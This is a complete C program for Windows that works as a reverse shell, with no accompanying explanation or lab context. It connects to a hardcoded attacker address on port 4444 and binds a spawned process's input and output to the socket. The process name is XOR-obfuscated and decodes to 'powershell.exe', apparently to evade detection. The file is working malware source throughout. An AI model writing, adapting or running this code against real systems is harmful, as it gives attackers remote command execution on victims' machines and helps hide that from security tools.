    #include <WinSock2.h>
    #include <stdio.h>
    #include <windows.h>
    #pragma comment(lib, "Ws2_32.lib")

    // gcc reverse_shell.c -o reverse_shell -lws2_32
    int main() {
        SOCKET shell;
        struct sockaddr_in shell_addr;
        WSADATA wsadata;
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        int connection;
        // port conn to atk
        int port = 4444;
        char RecvServer[512];
        if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) {
            printf("[!] WinSock initialization failed!");
            return 1;
        }
        shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);

        shell_addr.sin_port = htons(port);
        shell_addr.sin_family = AF_INET;
        // hardcode ip
        shell_addr.sin_addr.s_addr = inet_addr("172.29.71.202");

        connection = WSAConnect(shell, (struct sockaddr*) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
        if (connection == SOCKET_ERROR) {
            printf("[!] Connect to target server failed, please try again.\n");
            exit(0);
        } else {
            // recv(shell, RecvServer, sizeof(RecvServer), 0);
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell;
            unsigned char obfuscated[] = {
                0x25, 0x3a, 0x22, 0x30, 0x27, 0x26, 0x3d, 0x30, 
                0x39, 0x39, 0x7b, 0x30, 0x2d, 0x30, 0x00
            };
            
            char key = 0x55;
            char decoded[15];

            for (int i = 0; i < 14; i++) {
                decoded[i] = obfuscated[i] ^ key;
            }
            decoded[14] = '\0';
            CreateProcess(NULL, decoded, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            memset(RecvServer, 0, sizeof(RecvServer));
            closesocket(shell);
            WSACleanup();
        }

        return 0; 
    }